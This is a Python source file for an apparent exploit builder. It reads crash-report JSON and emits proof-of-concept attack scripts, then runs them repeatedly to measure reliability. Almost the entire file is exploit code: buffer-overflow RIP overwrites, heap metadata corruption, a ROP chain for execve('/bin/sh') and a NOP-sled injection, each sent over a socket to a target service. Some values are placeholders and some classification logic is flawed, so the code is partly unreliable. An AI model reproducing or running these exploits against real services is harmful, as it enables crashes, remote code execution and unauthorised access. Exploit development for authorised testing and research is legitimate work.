"""
POC Exploit Builder - Automated exploit code generation from crash analysis

Transforms crash forensic data into reproducible proof-of-concept exploits.
Supports multi-stage payload building, fuzzing, and automated testing.
"""

import json
import subprocess
import time
import socket
import struct
import sys
from dataclasses import dataclass
from typing import Dict, List, Optional, Any
from enum import Enum
import logging

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Exploit classification"""
    BUFFER_OVERFLOW = "buffer_overflow"
    HEAP_OVERFLOW = "heap_overflow"
    USE_AFTER_FREE = "use_after_free"
    CODE_INJECTION = "code_injection"
    STACK_PIVOT = "stack_pivot"
    JIT_SPRAY = "jit_spray"
    RACE_CONDITION = "race_condition"
    UNKNOWN = "unknown"


class PayloadStage(Enum):
    """Multi-stage payload construction"""
    TRIGGER = "trigger"           # Initial crash trigger
    SETUP = "setup"               # Memory setup (mmap, mprotect)
    PAYLOAD = "payload"           # Actual shellcode/ROP chain
    DELIVERY = "delivery"         # Send payload to target
    VERIFY = "verify"             # Verify exploitation success


@dataclass
class CrashContext:
    """Extracted crash context for POC building"""
    process_name: str
    binary_path: str
    pid: int
    signal: int
    rip: int
    rip_location: str  # HEAP/STACK/CODE/DATA
    buffer_size: int
    controllable_bytes: int
    network_triggered: bool
    target_ip: str
    target_port: int
    syscall_pattern: List[str]
    coredump_path: Optional[str] = None


@dataclass
class PayloadTemplate:
    """Payload construction template"""
    stage: PayloadStage
    description: str
    code: str
    expected_effect: str
    success_indicators: List[str]


class POCBuilder:
    """Builds and tests proof-of-concept exploits"""
    
    def __init__(self, crash_report: Dict[str, Any]):
        """Initialize POC builder from crash report JSON"""
        self.crash_report = crash_report
        self.context = self._extract_context(crash_report)
        self.exploit_type = self._classify_exploit()
        self.stages = []
        self.payload = b""
        self.test_results = []
    
    def _extract_context(self, report: Dict) -> CrashContext:
        """Extract relevant context from crash report"""
        
        metadata = report.get("metadata", {})
        forensics = report.get("forensics", {})
        analysis = report.get("analysis", {})
        
        cpu_context = forensics.get("cpu_context", {})
        
        return CrashContext(
            process_name=metadata.get("process", "unknown"),
            binary_path=metadata.get("binary", "unknown"),
            pid=metadata.get("pid", 0),
            signal=self._signal_to_int(metadata.get("signal", "SIGSEGV")),
            rip=int(cpu_context.get("rip", "0x0"), 0),
            rip_location=cpu_context.get("rip_location", "UNKNOWN"),
            buffer_size=self._estimate_buffer_size(report),
            controllable_bytes=self._find_controllable_bytes(report),
            network_triggered=self._check_network_trigger(report),
            target_ip="localhost",
            target_port=self._find_target_port(report),
            syscall_pattern=analysis.get("exploit_pattern", {}).get("syscalls", []),
            coredump_path=forensics.get("coredump", None)
        )
    
    def _classify_exploit(self) -> ExploitType:
        """Classify exploit type based on crash context"""
        
        signal_analysis = self.crash_report.get("analysis", {}).get("signal_analysis", {})
        exploit_pattern = self.crash_report.get("analysis", {}).get("exploit_pattern", {})
        
        if signal_analysis.get("type") == "NULL_POINTER_DEREFERENCE":
            return ExploitType.USE_AFTER_FREE
        
        if signal_analysis.get("type") == "HEAP_OVERFLOW":
            return ExploitType.HEAP_OVERFLOW
        
        if signal_analysis.get("type") == "STACK_OVERFLOW":
            return ExploitType.STACK_PIVOT
        
        if self.context.rip_location == "HEAP":
            return ExploitType.BUFFER_OVERFLOW
        
        if exploit_pattern.get("type") == "CODE_INJECTION_EXPLOIT":
            return ExploitType.CODE_INJECTION
        
        if exploit_pattern.get("type") == "JIT_SPRAY":
            return ExploitType.JIT_SPRAY
        
        return ExploitType.UNKNOWN
    
    def _signal_to_int(self, signal_name: str) -> int:
        """Convert signal name to number"""
        signals = {
            "SIGILL": 4,
            "SIGABRT": 6,
            "SIGBUS": 7,
            "SIGSEGV": 11,
        }
        return signals.get(signal_name, 11)
    
    def _estimate_buffer_size(self, report: Dict) -> int:
        """Estimate overflow buffer size from crash context"""
        # In real scenario, would analyze coredump
        return 1024
    
    def _find_controllable_bytes(self, report: Dict) -> int:
        """Find how many bytes attacker can control"""
        # In real scenario, would analyze payload pattern
        return 512
    
    def _check_network_trigger(self, report: Dict) -> bool:
        """Check if crash was network-triggered"""
        forensics = report.get("forensics", {})
        return len(forensics.get("network_activity", [])) > 0
    
    def _find_target_port(self, report: Dict) -> int:
        """Extract target service port from crash context"""
        # Default common ports
        return 8888
    
    def build_exploit(self) -> str:
        """Build complete exploit code"""
        
        logger.info(f"[*] Building {self.exploit_type.value} exploit")
        logger.info(f"[*] RIP location: {self.context.rip_location}")
        logger.info(f"[*] Buffer size: {self.context.buffer_size}")
        
        # Select strategy based on exploit type
        if self.exploit_type == ExploitType.BUFFER_OVERFLOW:
            return self._build_buffer_overflow()
        elif self.exploit_type == ExploitType.HEAP_OVERFLOW:
            return self._build_heap_overflow()
        elif self.exploit_type == ExploitType.STACK_PIVOT:
            return self._build_stack_pivot()
        elif self.exploit_type == ExploitType.CODE_INJECTION:
            return self._build_code_injection()
        else:
            return self._build_generic_exploit()
    
    def _build_buffer_overflow(self) -> str:
        """Build buffer overflow exploit"""
        
        template = f'''#!/usr/bin/env python3
"""
Buffer Overflow Exploit - {self.context.process_name}

Crash Analysis Context:
- Binary: {self.context.binary_path}
- Signal: {self.context.signal}
- RIP Location: {self.context.rip_location}
- Buffer Size: {self.context.buffer_size} bytes
- Exploit Type: {self.exploit_type.value}

Vulnerability: Stack buffer overflow with controlled RIP overwrite
"""

import socket
import subprocess
import sys
import time
import struct


class BufferOverflowExploit:
    """Buffer overflow POC"""
    
    def __init__(self, target_ip="{self.context.target_ip}", 
                 target_port={self.context.target_port}):
        self.target_ip = target_ip
        self.target_port = target_port
        self.buffer_size = {self.context.buffer_size}
        self.controllable_bytes = {self.context.controllable_bytes}
    
    def create_payload(self, payload_type="crash"):
        """Create exploit payload
        
        Args:
            payload_type: "crash" (verify exploit), "shell" (ROP chain)
        """
        
        # Stage 1: Fill buffer with controlled data
        buffer = b"A" * (self.buffer_size - 8)
        
        # Stage 2: RIP overwrite (return address)
        if payload_type == "crash":
            # Point RIP to invalid address to trigger crash
            rip_target = 0x41414141  # Will crash on invalid address
        else:
            # Point to ROP gadget or shellcode
            rip_target = 0x7ffff7ab4000  # Attacker-controlled memory
        
        buffer += struct.pack("<Q", rip_target)
        
        # Stage 3: Padding and alignment
        buffer += b"\\x00" * 16
        
        return buffer
    
    def send_payload(self, payload):
        """Send payload to vulnerable service"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.sendall(payload)
            sock.close()
            return True
        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            return False
    
    def verify_crash(self):
        """Verify process crashed after payload"""
        time.sleep(0.5)
        
        # Check if process is still running
        result = subprocess.run(
            ["pgrep", "-x", "{self.context.process_name}"],
            capture_output=True
        )
        
        if result.returncode == 0:
            return False  # Still running = exploit failed
        else:
            return True   # Crashed = exploit successful
    
    def run(self, iterations=1, payload_type="crash"):
        """Run exploit multiple times"""
        
        print(f"[*] Target: {{self.target_ip}}:{{self.target_port}}")
        print(f"[*] Buffer size: {{self.buffer_size}} bytes")
        print(f"[*] Exploit type: {self.exploit_type.value}")
        print()
        
        successful = 0
        
        for i in range(iterations):
            print(f"[*] Iteration {{i+1}}/{{iterations}}")
            
            # Create payload
            payload = self.create_payload(payload_type)
            print(f"    Payload size: {{len(payload)}} bytes")
            
            # Send exploit
            if not self.send_payload(payload):
                print(f"    [-] Send failed")
                continue
            
            # Verify crash
            if self.verify_crash():
                print(f"    [+] CRASH CONFIRMED")
                successful += 1
            else:
                print(f"    [-] No crash detected")
            
            time.sleep(0.5)
        
        print()
        print(f"[+] Results: {{successful}}/{{iterations}} successful")
        print(f"[+] Success rate: {{100*successful/iterations:.1f}}%")
        
        return successful / iterations >= 0.9  # 90% success = reliable exploit


if __name__ == "__main__":
    exploit = BufferOverflowExploit()
    
    # Test reproducibility (run 20 times)
    success_rate = exploit.run(iterations=20, payload_type="crash")
    
    if success_rate:
        print("[+] Exploit is RELIABLE and REPRODUCIBLE")
        sys.exit(0)
    else:
        print("[-] Exploit is unreliable - needs tuning")
        sys.exit(1)
'''
        
        return template
    
    def _build_heap_overflow(self) -> str:
        """Build heap overflow exploit"""
        
        template = f'''#!/usr/bin/env python3
"""
Heap Overflow Exploit - {self.context.process_name}

Vulnerability: Heap buffer overflow with heap metadata corruption
Technique: Overwrite malloc chunk header to achieve code execution
"""

import socket
import subprocess
import sys
import time
import struct


class HeapOverflowExploit:
    """Heap overflow POC"""
    
    def __init__(self, target_ip="{self.context.target_ip}",
                 target_port={self.context.target_port}):
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Heap chunk structure (64-bit):
        # [size | flags | prev_size | prev_flags] (16 bytes metadata)
        # [user data...]
        
        self.chunk_size = 0x100
        self.overflow_size = 0x20  # Overflow into next chunk
    
    def create_payload(self):
        """Create heap overflow payload"""
        
        # Stage 1: Align to chunk boundary
        buffer = b"A" * (self.chunk_size - 24)
        
        # Stage 2: Overwrite next chunk's metadata
        # Next chunk size = 0x111 (0x100 user + 0x10 overhead + IN_USE flag)
        fake_size = struct.pack("<Q", 0x101)  # Fake size (exploitable)
        fake_prev_size = struct.pack("<Q", 0x100)
        
        buffer += fake_size + fake_prev_size
        
        # Stage 3: Trigger consolidation
        # When next chunk is freed, heap consolidation will occur
        # Corrupted metadata allows arbitrary write
        
        return buffer
    
    def send_payload(self, payload):
        """Send payload"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.sendall(payload)
            sock.close()
            return True
        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            return False
    
    def run(self, iterations=1):
        """Run exploit"""
        
        print(f"[*] Target: {{self.target_ip}}:{{self.target_port}}")
        print(f"[*] Exploit type: Heap overflow")
        print()
        
        for i in range(iterations):
            print(f"[*] Iteration {{i+1}}/{{iterations}}")
            
            payload = self.create_payload()
            if self.send_payload(payload):
                print(f"    [+] Payload sent")
            else:
                print(f"    [-] Send failed")
            
            time.sleep(0.5)


if __name__ == "__main__":
    exploit = HeapOverflowExploit()
    exploit.run(iterations=10)
'''
        
        return template
    
    def _build_stack_pivot(self) -> str:
        """Build ROP-based stack pivot exploit"""
        
        return f'''#!/usr/bin/env python3
"""
Stack Pivot + ROP Exploit - {self.context.process_name}

Vulnerability: Stack overflow with stack pivot to ROP chain
Technique: Overwrite RIP, pivot stack, execute ROP gadget chain
"""

import socket
import subprocess
import sys
import time
import struct


class StackPivotExploit:
    """Stack pivot + ROP POC"""
    
    def __init__(self):
        self.target_ip = "{self.context.target_ip}"
        self.target_port = {self.context.target_port}
        
        # ROP gadgets (found via binary analysis)
        self.gadgets = {{
            "pop_rdi": 0x0000555555555100,        # pop rdi; ret
            "pop_rsi": 0x0000555555555101,        # pop rsi; ret
            "pop_rdx": 0x0000555555555102,        # pop rdx; ret
            "syscall": 0x0000555555555103,        # syscall
        }}
    
    def create_rop_chain(self):
        """Build ROP gadget chain for execve("/bin/sh", NULL, NULL)"""
        
        chain = b""
        
        # ROP gadget 1: pop rdi; ret
        chain += struct.pack("<Q", self.gadgets["pop_rdi"])
        chain += struct.pack("<Q", 0x7ffff7ab4000)  # "/bin/sh" string address
        
        # ROP gadget 2: pop rsi; ret
        chain += struct.pack("<Q", self.gadgets["pop_rsi"])
        chain += struct.pack("<Q", 0)  # NULL
        
        # ROP gadget 3: pop rdx; ret
        chain += struct.pack("<Q", self.gadgets["pop_rdx"])
        chain += struct.pack("<Q", 0)  # NULL
        
        # ROP gadget 4: syscall (execve = 59)
        chain += struct.pack("<Q", self.gadgets["syscall"])
        
        return chain
    
    def create_payload(self):
        """Create stack pivot payload"""
        
        buffer = b"A" * 1024
        rop_chain = self.create_rop_chain()
        
        payload = buffer + rop_chain
        return payload
    
    def send_payload(self, payload):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.sendall(payload)
            sock.close()
            return True
        except:
            return False
    
    def run(self):
        print("[*] Stack Pivot + ROP Exploit")
        payload = self.create_payload()
        self.send_payload(payload)
        print("[+] ROP chain delivered")


if __name__ == "__main__":
    exploit = StackPivotExploit()
    exploit.run()
'''
    
    def _build_code_injection(self) -> str:
        """Build code injection exploit"""
        return f'''#!/usr/bin/env python3
"""Code Injection Exploit"""

import socket

class CodeInjectionExploit:
    def __init__(self):
        self.target_ip = "{self.context.target_ip}"
        self.target_port = {self.context.target_port}
    
    def create_payload(self):
        # Inject malicious code via vulnerable parameter
        shellcode = b"\\x90" * 100  # NOP sled
        shellcode += b"\\xcc" * 10  # INT3 (breakpoint)
        return shellcode
    
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_ip, self.target_port))
        sock.sendall(self.create_payload())
        sock.close()

if __name__ == "__main__":
    CodeInjectionExploit().run()
'''
    
    def _build_generic_exploit(self) -> str:
        """Build generic crash trigger"""
        return f'''#!/usr/bin/env python3
"""Generic Exploit - {self.context.process_name}"""

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("{self.context.target_ip}", {self.context.target_port}))
sock.sendall(b"A" * 2048)
sock.close()
'''
    
    def export_poc(self, filepath: str) -> str:
        """Export POC to file"""
        
        exploit_code = self.build_exploit()
        
        with open(filepath, "w") as f:
            f.write(exploit_code)
        
        # Make executable
        subprocess.run(["chmod", "+x", filepath])
        
        logger.info(f"[+] POC exported: {filepath}")
        return filepath
    
    def test_poc(self, poc_path: str, iterations: int = 5) -> Dict[str, Any]:
        """Test POC reliability"""
        
        logger.info(f"[*] Testing POC ({iterations} iterations)")
        
        results = {
            "total_runs": iterations,
            "successful": 0,
            "failed": 0,
            "success_rate": 0.0,
            "reliable": False
        }
        
        for i in range(iterations):
            try:
                result = subprocess.run(
                    ["python3", poc_path],
                    capture_output=True,
                    timeout=5
                )
                
                if result.returncode == 0:
                    results["successful"] += 1
                else:
                    results["failed"] += 1
            
            except subprocess.TimeoutExpired:
                results["failed"] += 1
            
            time.sleep(1)
        
        results["success_rate"] = results["successful"] / iterations
        results["reliable"] = results["success_rate"] >= 0.8  # 80% threshold
        
        return results


def rebuild_poc_from_crash(crash_report_path: str, output_dir: str) -> str:
    """High-level function: Load crash report → Build POC → Test → Export
    
    This is the main entry point for the POC rebuild pipeline.
    """
    
    logger.info(f"[*] Loading crash report: {crash_report_path}")
    
    # Load crash analysis
    with open(crash_report_path) as f:
        crash_report = json.load(f)
    
    # Build POC
    logger.info(f"[*] Building POC...")
    builder = POCBuilder(crash_report)
    
    # Export POC
    poc_path = f"{output_dir}/exploit_{builder.exploit_type.value}.py"
    builder.export_poc(poc_path)
    
    # Test POC reliability
    logger.info(f"[*] Testing POC reliability...")
    results = builder.test_poc(poc_path, iterations=10)
    
    logger.info(f"[+] Success rate: {results['success_rate']*100:.1f}%")
    logger.info(f"[+] Reliable: {results['reliable']}")
    
    # Export test results
    results_path = f"{output_dir}/poc_test_results.json"
    with open(results_path, "w") as f:
        json.dump(results, f, indent=2)
    
    return poc_path
